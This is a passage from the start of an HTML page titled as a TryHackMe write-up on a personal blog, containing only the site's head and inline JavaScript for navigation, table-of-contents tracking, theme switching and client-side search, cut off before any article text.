<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Writeup THM | Ian Levy</title>

  <script defer src="../../js/fuse.min.94c78ad70b02749822921660cf4e9f0b3701bc0680c421afb784a78228de0275.js"></script>
  <script src="../../js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>
  <script defer src="../../js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>
  <script defer src="../../js/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>
  <script defer src="../../js/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>
  <script defer src="../../js/closest.min.js"></script>

  <script>
    "use strict";
    if (window.NodeList && !NodeList.prototype.forEach) {
      NodeList.prototype.forEach = Array.prototype.forEach;
    }
    if (!String.prototype.includes) {
      String.prototype.includes = function (search, start) {
        'use strict';
        if (search instanceof RegExp) {
          throw TypeError('first argument must not be a RegExp');
        }
        if (start === undefined) {
          start = 0;
        }
        return this.indexOf(search, start) !== -1;
      };
    }
    Document.prototype.append = Element.prototype.append = function append() {
      this.appendChild(_mutation(arguments));
    };

    function _mutation(nodes) {
      if (!nodes.length) {
        throw new Error('DOM Exception 8');
      } else if (nodes.length === 1) {
        return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
      } else {
        var
          fragment = document.createDocumentFragment(),
          length = nodes.length,
          index = -1,
          node;

        while (++index < length) {
          node = nodes[index];

          fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
        }

        return fragment;
      }
    }

    if (!String.prototype.startsWith) {
      String.prototype.startsWith = function (searchString, position) {
        position = position || 0;
        return this.indexOf(searchString, position) === position;
      };
    }

    document.addEventListener('DOMContentLoaded', function () {

      var navCollapseBtn = document.querySelector('.navbar__burger');
      navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
        var navCollapse = document.querySelector('.navbarm__collapse');

        if (navCollapse) {
          var dataOpen = navCollapse.getAttribute('data-open');

          if (dataOpen === 'true') {
            navCollapse.setAttribute('data-open', 'false');
            navCollapse.style.maxHeight = 0;
            navCollapseBtn.classList.remove('is-active');
          } else {
            navCollapse.setAttribute('data-open', 'true');
            navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
            navCollapseBtn.classList.add('is-active');
          }
        }
      }) : null;

      var summaryContainer = document.querySelector('.summary__container');
      var searchResult = document.querySelector('.search-result');
      var searchResultCloseBtn = document.querySelector('.search-result__close');
      searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
        searchResult.setAttribute('data-display', 'none');
        summaryContainer.setAttribute('data-display', 'block');
      }) : null;

      document.querySelectorAll('.tab') ?
        document.querySelectorAll('.tab').forEach(function (elem, idx) {
          var containerId = elem.getAttribute('id');
          var containerElem = elem;
          var tabLinks = elem.querySelectorAll('.tab__link');
          var tabContents = elem.querySelectorAll('.tab__content');
          var ids = [];

          tabLinks && tabLinks.length > 0 ?
            tabLinks.forEach(function (link, index, self) {
              link.onclick = function (e) {
                for (var i = 0; i < self.length; i++) {
                  if (index === parseInt(i, 10)) {
                    if (!self[i].classList.contains('active')) {
                      self[i].classList.add('active');
                      tabContents[i].style.display = 'block';
                    }
                  } else {
                    self[i].classList.remove('active');
                    tabContents[i].style.display = 'none';
                  }
                }
              }
            }) : null;
        }) : null;

      document.querySelectorAll('.codetab') ?
        document.querySelectorAll('.codetab').forEach(function (elem, idx) {
          var containerId = elem.getAttribute('id');
          var containerElem = elem;
          var codetabLinks = elem.querySelectorAll('.codetab__link');
          var codetabContents = elem.querySelectorAll('.codetab__content');
          var ids = [];

          codetabLinks && codetabLinks.length > 0 ?
            codetabLinks.forEach(function (link, index, self) {
              link.onclick = function (e) {
                for (var i = 0; i < self.length; i++) {
                  if (index === parseInt(i, 10)) {
                    if (!self[i].classList.contains('active')) {
                      self[i].classList.add('active');
                      codetabContents[i].style.display = 'block';
                    }
                  } else {
                    self[i].classList.remove('active');
                    codetabContents[i].style.display = 'none';
                  }
                }
              }
            }) : null;
        }) : null;

      var gttBtn = document.getElementById("gtt");
      gttBtn.style.display = "none";
      gttBtn.addEventListener('click', function () {
        if (window.document.documentMode) {
          document.documentElement.scrollTop = 0;
        } else {
          scrollToTop(250);
        }
      });

      function scrollToTop(scrollDuration) {
        var scrollStep = -window.scrollY / (scrollDuration / 15);
        var scrollInterval = setInterval(function () {
          if (window.scrollY != 0) {
            window.scrollBy(0, scrollStep);
          } else clearInterval(scrollInterval);
        }, 15);
      }

      var scrollFunction = function () {
        if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
          gttBtn.style.display = "block";
        } else {
          gttBtn.style.display = "none";
        }
      }

      var expandBtn = document.querySelectorAll('.expand__button');

      for (let i = 0; i < expandBtn.length; i++) {
        expandBtn[i].addEventListener("click", function () {
          var content = this.nextElementSibling;
          if (content.style.maxHeight) {
            content.style.maxHeight = null;
            this.querySelector('svg').classList.add('expand-icon__right');
            this.querySelector('svg').classList.remove('expand-icon__down');
          } else {
            content.style.maxHeight = content.scrollHeight + "px";
            this.querySelector('svg').classList.remove('expand-icon__right');
            this.querySelector('svg').classList.add('expand-icon__down');
          }
        });
      }

      var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
      var tocElem = document.querySelector('.toc');
      var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
      var toggleTocElem = document.getElementById('toggle-toc');
      var singleContentsElem = document.querySelector('.single__contents');
      var navbar = document.querySelector('.navbar');
      var tocFlexbox = document.querySelector('.toc__flexbox');
      var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
      var expandContents = document.querySelectorAll('.expand__content');
      var boxContents = document.querySelectorAll('.box');
      var notAllowedTitleIds = null;
      var tocFolding = JSON.parse("null");
      var tocLevels = JSON.parse("null");

      if (tocLevels) {
        tocLevels = tocLevels.toString();
      } else {
        tocLevels = "h1, h2, h3, h4, h5, h6";
      }

      singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
        singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
          elem.querySelectorAll(tocLevels).forEach(function (element) {
            notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
              notAllowedTitleIds.concat(element.getAttribute('id')) : [element.getAttribute('id')];
          });
        }) : null;

      expandContents ? expandContents.forEach(function (elem) {
        elem.querySelectorAll(tocLevels).forEach(function (element) {
          notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
            notAllowedTitleIds.concat(element.getAttribute('id')) : [element.getAttribute('id')];
        });
      }) : null;

      boxContents ? boxContents.forEach(function (elem) {
        elem.querySelectorAll(tocLevels).forEach(function (element) {
          notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
            notAllowedTitleIds.concat(element.getAttribute('id')) : [element.getAttribute('id')];
        });
      }) : null;

      window.onscroll = function () {
        scrollFunction();

        var st = window.pageYOffset || document.documentElement.scrollTop;
        if (st > lastScrollTop) {
          if (st < 250) {
            gttBtn.style.display = "none";
          } else {
            gttBtn.style.display = "block";
          }

          if (st < 45) {
            return null;
          }

          if (!navbar.classList.contains('navbar--hide')) {
            navbar.classList.add('navbar--hide');
          } else if (navbar.classList.contains('navbar--show')) {
            navbar.classList.remove('navbar--show');
          }

          if (singleContentsElem) {
            if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
              singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
                if (toggleTocElem && !toggleTocElem.checked) {
                  return null;
                }

                if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                  return null;
                }

                if (document.documentElement.scrollTop >= elem.offsetTop) {
                  if (tableOfContentsElem) {
                    var id = elem.getAttribute('id');
                    tocElem.querySelectorAll('a').forEach(function (elem) {
                      elem.classList.remove('active');
                    });
                    tocElem.querySelector('a[href="#' + id + '"]') ?
                      tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                    if (false === tocFolding) {

                    } else {
                      tableOfContentsElem.querySelectorAll('ul') ?
                        tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                          rootUl.querySelectorAll('li').forEach(function (liElem) {
                            liElem.querySelectorAll('ul').forEach(function (ulElem) {
                              ulElem.style.display = 'none';
                            });
                          });
                        }) : null;
                    }

                    var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                    if (curElem && curElem.nextElementSibling) {
                      curElem.nextElementSibling.style.display = 'block';
                    }
                    getParents(curElem, 'ul') ?
                      getParents(curElem, 'ul').forEach(function (elem) {
                        elem.style.display = 'block';
                      }) : null;
                  }
                }
              });
            } else {
              if (tocFlexbox) {
                tocFlexbox.setAttribute('data-position', '');
                if (!tocFlexbox.classList.contains('hide')) {
                  tocFlexbox.classList.add('hide');
                }
              }
              if (tocFlexboxOuter) {
                tocFlexboxOuter.setAttribute('data-position', '');
                if (!tocFlexboxOuter.classList.contains('hide')) {
                  tocFlexboxOuter.classList.add('hide');
                }
              }
            }
          }
        } else {
          if (st < 250) {
            gttBtn.style.display = "none";
          }

          if (navbar.classList.contains('navbar--hide')) {
            navbar.classList.remove('navbar--hide');
          } else if (!navbar.classList.contains('navbar--show')) {
            navbar.classList.add('navbar--show');
          }

          if (singleContentsElem) {
            if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
              singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
                if (toggleTocElem && !toggleTocElem.checked) {
                  return null;
                }

                if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                  return null;
                }

                if (document.documentElement.scrollTop >= elem.offsetTop) {
                  if (tableOfContentsElem) {
                    var id = elem.getAttribute('id');
                    tocElem.querySelectorAll('a').forEach(function (elem) {
                      elem.classList.remove('active');
                    });
                    tocElem.querySelector('a[href="#' + id + '"]') ?
                      tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                    if (false === tocFolding) {

                    } else {
                      tableOfContentsElem.querySelectorAll('ul') ?
                        tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                          rootUl.querySelectorAll('li').forEach(function (liElem) {
                            liElem.querySelectorAll('ul').forEach(function (ulElem) {
                              ulElem.style.display = 'none';
                            });
                          });
                        }) : null;
                    }

                    var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                    if (curElem && curElem.nextElementSibling) {
                      curElem.nextElementSibling.style.display = 'block';
                    }
                    getParents(curElem, 'ul') ?
                      getParents(curElem, 'ul').forEach(function (elem) {
                        elem.style.display = 'block';
                      }) : null;
                  }
                }
              });
            } else {
              if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
              if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }

          }

          if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
            if (false === tocFolding) {

            } else {
              tableOfContentsElem.querySelector('ul') ?
                tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                  liElem.querySelectorAll('ul').forEach(function (ulElem) {
                    ulElem.style.display = 'none';
                  });
                }) : null;
            }
          }
        }
        lastScrollTop = st <= 0 ? 0 : st;
      };

      var localTheme = localStorage.getItem('theme');
      var rootEleme = document.getElementById('root');
      var selectThemeElem = document.querySelectorAll('.select-theme');
      var selectThemeItemElem = document.querySelectorAll('.select-theme__item');

      var setMetaColor = function (themeColor) {
        var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
        var metaThemeColor = document.getElementsByName('theme-color')[0];
        var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
        var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName(
          'apple-mobile-web-app-status-bar-style')[0];

        if (themeColor.includes('dark')) {
          metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
          metaThemeColor.setAttribute('content', '#403E41');
          metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
          metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
        } else if (themeColor.includes('light')) {
          metaMsapplicationTileColor.setAttribute('content', '#555');
          metaThemeColor.setAttribute('content', '#eee');
          metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
          metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
        } else if (themeColor.includes('hacker')) {
          metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
          metaThemeColor.setAttribute('content', '#252526');
          metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
          metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
        } else if (themeColor.includes('solarized')) {
          metaMsapplicationTileColor.setAttribute('content', '#d3af86');
          metaThemeColor.setAttribute('content', '#51412c');
          metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
          metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
        } else if (themeColor.includes('kimbie')) {
          metaMsapplicationTileColor.setAttribute('content', '#586e75');
          metaThemeColor.setAttribute('content', '#eee8d5');
          metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
          metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
        }
      }

      if (localTheme) {
        selectThemeItemElem ?
          selectThemeItemElem.forEach(function (elem) {
            if (elem.text.trim() === localTheme) {
              elem.classList.add('is-active');
            } else {
              elem.classList.remove('is-active');
            }
          }) : null;

        setMetaColor(localTheme);
      } else {
        setMetaColor(rootEleme.className);
      }

      selectThemeItemElem ?
        selectThemeItemElem.forEach(function (v, i) {
          v.addEventListener('click', function (e) {
            var selectedThemeVariant = e.target.text.trim();
            localStorage.setItem('theme', selectedThemeVariant);
            setMetaColor(selectedThemeVariant);

            rootEleme.removeAttribute('class');
            rootEleme.classList.add('theme__' + selectedThemeVariant);
            selectThemeElem.forEach(function (rootElem) {
              rootElem.querySelectorAll('a').forEach(function (elem) {
                if (elem.classList) {
                  if (elem.text.trim() === selectedThemeVariant) {
                    if (!elem.classList.contains('is-active')) {
                      elem.classList.add('is-active');
                    }
                  } else {
                    if (elem.classList.contains('is-active')) {
                      elem.classList.remove('is-active');
                    }
                  }
                }
              });
            });

            if (window.mermaid) {
              if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
                mermaid.initialize({
                  theme: 'dark'
                });
                location.reload();
              } else {
                mermaid.initialize({
                  theme: 'default'
                });
                location.reload();
              }
            }

            var utterances = document.getElementById('utterances');
            if (utterances) {
              utterances.querySelector('iframe').contentWindow.postMessage({
                type: 'set-theme',
                theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ?
                  'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' :
                  'github-light',
              }, 'https://utteranc.es/');
            }

            var twitterCards = document.querySelectorAll('.twitter-timeline');
            if (twitterCards) {
              window.postMessage({
                type: 'set-twitter-theme',
                theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ?
                  'light' : 'dark',
              });
            }
          });
        }) : null;

      var baseurl = JSON.parse("\"https://github.com/PainTensei\"");

      var permalink = JSON.parse("\"https://github.com/PainTensei\"");

      var langprefix = JSON.parse("\"\"");
      var searchResults = null;
      var searchMenu = null;
      var searchText = null;

      var enableSearch = JSON.parse("true");

      var enableSearchHighlight = JSON.parse("true");

      var searchResultPosition = JSON.parse("\"main\"");

      var sectionType = JSON.parse("\"posts\"");

      var kind = JSON.parse("\"page\"");

      var fuse = null;

      if (enableSearch) {
        (function initFuse() {
          var xhr = new XMLHttpRequest();
          if (sectionType === "publication" && kind !== "page") {
            xhr.open('GET.html', permalink + "index.json");
          } else {
            xhr.open('GET.html', baseurl + langprefix + "/index.json");
          }

          xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
          xhr.onload = function () {
            if (xhr.status === 200) {
              fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
                keys: sectionType.includes('publication') ? ['title', 'abstract'] : ['title', 'description',
                  'content'
                ],
                includeMatches: enableSearchHighlight,
                shouldSort: true,
                threshold: 0.4,
                location: 0,
                distance: 100,
                maxPatternLength: 32,
                minMatchCharLength: 1,
              });
              window.fuse = fuse;
            } else {
              console.error('[' + xhr.status + ']Error:', xhr.statusText);
            }
          };
          xhr.send();
        })();
      }

      function makeLi(ulElem, obj) {
        var li = document.createElement('li');
        li.className = 'search-result__item';

        var a = document.createElement('a');
        a.innerHTML = obj.title;
        a.setAttribute('class', 'search-result__item--title');
        a.setAttribute('href', obj.permalink);

        var descDiv = document.createElement('div');
        descDiv.setAttribute('class', 'search-result__item--desc');
        if (obj.description) {
          descDiv.innerHTML = obj.description;
        } else if (obj.content) {
          descDiv.innerHTML = obj.content.substring(0, 225);
        }

        li.appendChild(a);
        li.appendChild(descDiv);
        ulElem.appendChild(li);
      }

      function makeHighlightLi(ulElem, obj) {
        var li = document.createElement('li');
        li.className = 'search-result__item';
        var descDiv = null;

        var a = document.createElement('a');
        a.innerHTML = obj.item.title;
        a.setAttribute('class', 'search-result__item--title');
        a.setAttribute('href', obj.item.uri);

        if (obj.matches && obj.matches.length) {
          for (var i = 0; i < obj.matches.length; i++) {
            if ('title' === obj.matches[i].key) {
              a = document.createElement('a');
              a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
              a.setAttribute('class', 'search-result__item--title');
              a.setAttribute('href', obj.item.uri);
            }

            if ('description' === obj.matches[i].key) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
            } else if ('content' === obj.matches[i].key) {
              if (!descDiv) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'search-result__item--desc');
                descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i]
                  .indices);
              }
            } else {
              if (obj.item.description) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'search-result__item--desc');
                descDiv.innerHTML = obj.item.description;
              } else {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'search-result__item--desc');
                descDiv.innerHTML = obj.item.content.substring(0, 150);
              }
            }
          }

          li.appendChild(a);
          if (descDiv) {
            li.appendChild(descDiv);
          }
          if (li) {
            ulElem.appendChild(li);
          }
        }
      }

      function renderSearchResultsSide(searchText, results) {
        searchResults = document.getElementById('search-results');
        searchMenu = document.getElementById('search-menu');
        searchResults.setAttribute('class', 'dropdown is-active');

        var ul = document.createElement('ul');
        ul.setAttribute('class', 'dropdown-content search-content');

        if (results.length) {
          results.forEach(function (result) {
            var li = document.createElement('li');
            var a = document.createElement('a');
            a.setAttribute('href', result.uri);
            a.setAttribute('class', 'dropdown-item');
            a.appendChild(li);

            var titleDiv = document.createElement('div');
            titleDiv.innerHTML = result.title;
            titleDiv.setAttribute('class', 'menu-item__title');

            var descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'menu-item__desc');
            if (result.description) {
              descDiv.innerHTML = result.description;
            } else if (result.content) {
              descDiv.innerHTML = result.content.substring(0, 150);
            }

            li.appendChild(titleDiv);
            li.appendChild(descDiv);
            ul.appendChild(a);
          });
        } else {
          var li = document.createElement('li');
          li.setAttribute('class', 'dropdown-item');
          li.innerText = 'No results found';
          ul.appendChild(li);
        }

        while (searchMenu.hasChildNodes()) {
          searchMenu.removeChild(
            searchMenu.lastChild
          );
        }

        searchMenu.appendChild(ul);
      }

      function renderSearchHighlightResultsSide(searchText, results) {
        searchResults = document.getElementById('search-results');
        searchMenu = document.getElementById('search-menu');
        searchResults.setAttribute('class', 'dropdown is-active');

        var ul = document.createElement('ul');
        ul.setAttribute('class', 'dropdown-content search-content');

        if (results.length) {
          results.forEach(function (result) {
            var li = document.createElement('li');
            var a = document.createElement('a');
            var descDiv = null;

            a.setAttribute('href', result.item.uri);
            a.setAttribute('class', 'dropdown-item');
            a.appendChild(li);

            var titleDiv = document.createElement('div');
            titleDiv.innerHTML = result.item.title;
            titleDiv.setAttribute('class', 'menu-item__title');

            if (result.matches && result.matches.length) {
              for (var i = 0; i < result.matches.length; i++) {
                if ('title' === result.matches[i].key) {
                  titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i]
                    .indices);
                }

                if ('description' === result.matches[i].key) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i]
                    .indices);
                } else if ('content' === result.matches[i].key) {
                  if (!descDiv) {
                    descDiv = document.createElement('div');
                    descDiv.setAttribute('class', 'menu-item__desc');
                    descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result
                      .matches[i].indices);
                  }
                } else {
                  if (result.item.description) {
                    descDiv = document.createElement('div');
                    descDiv.setAttribute('class', 'menu-item__desc');
                    descDiv.innerHTML = result.item.description;
                  } else {
                    descDiv = document.createElement('div');
                    descDiv.setAttribute('class', 'menu-item__desc');
                    descDiv.innerHTML = result.item.content.substring(0, 150);
                  }
                }
              }

              li.appendChild(titleDiv);
              if (descDiv) {
                li.appendChild(descDiv);
              }
              ul.appendChild(a);
            }
          });
        } else {
          var li = document.createElement('li');
          li.setAttribute('class', 'dropdown-item');
          li.innerText = 'No results found';
          ul.appendChild(li);
        }

        while (searchMenu.hasChildNodes()) {
          searchMenu.removeChild(
            searchMenu.lastChild
          );
        }
        searchMenu.appendChild(ul);
      }

      function renderSearchResultsMobile(searchText, results) {
        searchResults = document.getElementById('search-mobile-results');

        var content = document.createElement('div');
        content.setAttribute('class', 'mobile-search__content');

        if (results.length > 0) {
          results.forEach(function (result) {
            var item = document.createElement('a');
            item.setAttribute('href', result.uri);
            item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">📄 ' +
              result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result
                .description : result.content) + '</div></div>';
            content.appendChild(item);
          });
        } else {
          var item = document.createElement('span');
          content.appendChild(item);
        }

        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild)
        }
        searchResults.appendChild(content);
      }

      function renderSearchHighlightResultsMobile(searchText, results) {
        searchResults = document.getElementById('search-mobile-results');

        var ul = document.createElement('div');
        ul.setAttribute('class', 'mobile-search__content');

        if (results.length) {
          results.forEach(function (result) {
            var li = document.createElement('li');
            var a = document.createElement('a');
            var descDiv = null;

            a.setAttribute('href', result.item.uri);
            a.appendChild(li);
            li.setAttribute('class', 'mobile-search__item');

            var titleDiv = document.createElement('div');
            titleDiv.innerHTML = result.item.title;
            titleDiv.setAttribute('class', 'mobile-search__item--title');

            if (result.matches && result.matches.length) {
              for (var i = 0; i < result.matches.length; i++) {
                if ('title' === result.matches[i].key) {
                  titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i]
                    .indices);
                }

                if ('description' === result.matches[i].key) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i]
                    .indices);
                } else if ('content' === result.matches[i].key) {
                  if (!descDiv) {
                    descDiv = document.createElement('div');
                    descDiv.setAttribute('class', 'mobile-search__item--desc');
                    descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result
                      .matches[i].indices);
                  }
                } else {
                  if (result.item.description) {
                    descDiv = document.createElement('div');
                    descDiv.setAttribute('class', 'mobile-search__item--desc');
                    descDiv.innerHTML = result.item.description;
                  } else {
                    descDiv = document.createElement('div');
                    descDiv.setAttribute('class', 'mobile-search__item--desc');
                    descDiv.innerHTML = result.item.content.substring(0, 150);
                  }
                }
              }

              li.appendChild(titleDiv);
              if (descDiv) {
                li.appendChild(descDiv);
              }
              ul.appendChild(a);
            }
          });
        } else {
          var item = document.createElement('span');
          ul.appendChild(item);
        }

        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild)
        }
        searchResults.appendChild(ul);
      }

      function generateHighlightedText(text, regions) {
        if (!regions) {
          return text;
        }

        var content = '',
          nextUnhighlightedRegionStartingIndex = 0;

        regions.forEach(function (region) {
          if (region[0] === region[1]) {
            return null;
          }

          content += '' +
            text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
            '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
            '</span>' +
            '';
          nextUnhighlightedRegionStartingIndex = region[1] + 1;
        });

        content += text.substring(nextUnhighlightedRegionStartingIndex);

        return content;
      };

      var searchElem = document.getElementById('search');
      var searchMobile = document.getElementById('search-mobile');
      var searchResultsContainer = document.getElementById('search-results');

      searchElem ?
        searchElem.addEventListener('input', function (e) {
          if (!e.target.value | window.innerWidth < 770) {
            searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
            searchResult ? searchResult.setAttribute('data-display', 'none') : null;
            summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
            return null;
          }

          searchText = e.target.value;
          var results = fuse.search(e.target.value);

          if (searchResultPosition === "main") {
            if (enableSearchHighlight) {
              renderSearchHighlightResultsMain(searchText, results);
            } else {
              renderSearchResultsMain(searchText, results);
            }
          } else {
            if (enableSearchHighlight) {
              renderSearchHighlightResultsSide(searchText, results);
            } else {
              renderSearchResultsSide(searchText, results);
            }

            var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
            dropdownItems ? dropdownItems.forEach(function (item) {
              item.addEventListener('mousedown', function (e) {
                e.target.click();
              });
            }) : null;
          }
        }) : null;

      searchElem ?
        searchElem.addEventListener('blur', function () {
          if (window.innerWidth < 770) {
            return null;
          }
          searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        }) : null;

      searchElem ?
        searchElem.addEventListener('click', function (e) {
          if (window.innerWidth < 770) {
            return null;
          }
          if (!e.target.value) {
            searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
            return null;
          }

          searchText = e.target.value;
          var results = fuse.search(e.target.value);

          if (searchResultPosition === "main") {
            if (enableSearchHighlight) {
              renderSearchHighlightResultsMain(searchText, results);
            } else {
              renderSearchResultsMain(searchText, results);
            }
          } else {
            if (enableSearchHighlight) {
              renderSearchHighlightResultsSide(searchText, results);
            } else {
              renderSearchResultsSide(searchText, results);
            }

            var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
            dropdownItems ? dropdownItems.forEach(function (item) {
              item.addEventListener('mousedown', function (e) {
                e.target.click();
              });
            }) : null;
          }
        }) : null;

      var searchMenuElem = document.getElementById("search-menu");
      var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
      var activeIndex = null;
      var items = null;
      var searchContainerMaxHeight = 350;

      searchElem ?
        searchElem.addEventListener('keydown', function (e) {
          if (window.innerWidth < 770) {
            return null;
          }

          if (e.key === 'Escape') {
            searchResult ? searchResult.setAttribute('data-display', 'none') : null;
            summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
          }

          var items = document.querySelectorAll('#search-menu .dropdown-item');
          var keyCode = e.which || e.keyCode;

          if (!items || !items.length) {
            return null;
          }

          if (e.key === 'ArrowDown' || keyCode === 40) {
            if (activeIndex === null) {
              activeIndex = 0;
              items[activeIndex].classList.remove('is-active');
            } else {
              items[activeIndex].classList.remove('is-active');
              activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
            }
            items[activeIndex].classList.add('is-active');

            let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight -
              searchContainerMaxHeight;
            if (overflowedPixel > 0) {
              document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect()
                .height;
            } else if (activeIndex === 0) {
              document.querySelector(".search-content").scrollTop = 0;
            }
          } else if (e.key === 'ArrowUp' || keyCode === 38) {
            if (activeIndex === null) {
              activeIndex = items.length - 1;
              items[activeIndex].classList.remove('is-active');
            } else {
              items[activeIndex].classList.remove('is-active');
              activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
            }
            items[activeIndex].classList.add('is-active');

            let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight -
              searchContainerMaxHeight;
            if (overflowedPixel < 0) {
              document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect()
                .height;
            } else {
              document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex]
                .getBoundingClientRect().height;
            }
          } else if (e.key === 'Enter' || keyCode === 13) {
            if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
              location.href = items[activeIndex].getAttribute('href');
            }
          } else if (e.key === 'Escape' || keyCode === 27) {
            e.target.value = null;
            if (searchResults) {
              searchResults.classList.remove('is-active');
            }
          }
        }) : null;

      searchMobile ?
        searchMobile.addEventListener('input', function (e) {
          if (!e.target.value) {
            let wrap = document.getElementById('search-mobile-results');
            while (wrap.firstChild) {
              wrap.removeChild(wrap.firstChild);
            }
            return null;
          }

          searchText = e.target.value;
          var results = fuse.search(e.target.value);
          renderSearchResultsMobile(searchText, results);
          if (enableSearchHighlight) {
            renderSearchHighlightResultsMobile(searchText, results);
          } else {
            renderSearchResultsMobile(searchText, results);
          }
        }) : null;

      var mobileSearchInputElem = document.querySelector('#search-mobile');
      var mobileSearchClassElem = document.querySelector('.mobile-search');
      var mobileSearchBtnElem = document.querySelector('#mobileSearchBtn');
      var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
      var mobileSearchContainer = document.querySelector('#search-mobile-container');
      var mobileSearchResultsElem = document.querySelector('#search-mobile-results');
